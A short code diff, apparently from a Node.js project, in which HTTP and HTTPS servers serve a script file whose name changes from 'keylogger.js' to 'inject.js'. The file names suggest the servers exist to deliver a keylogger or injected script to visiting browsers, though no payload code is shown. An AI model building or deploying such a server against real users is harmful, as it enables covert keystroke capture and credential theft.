@@ -94,7 +94,7 @@ var encryption = {
 };
 
 https.createServer(encryption, (req, res) => {
-    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
+    fs.readFile(__dirname + '/app/utils/inject.js', function (err, data) {
         if (err) {
             res.writeHead(404);
             res.end(JSON.stringify(err));
@@ -108,7 +108,7 @@ https.createServer(encryption, (req, res) => {
 });
 
 http.createServer((req, res) => {
-    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
+    fs.readFile(__dirname + '/app/utils/inject.js', function (err, data) {
         if (err) {
             res.writeHead(404);
             res.end(JSON.stringify(err));
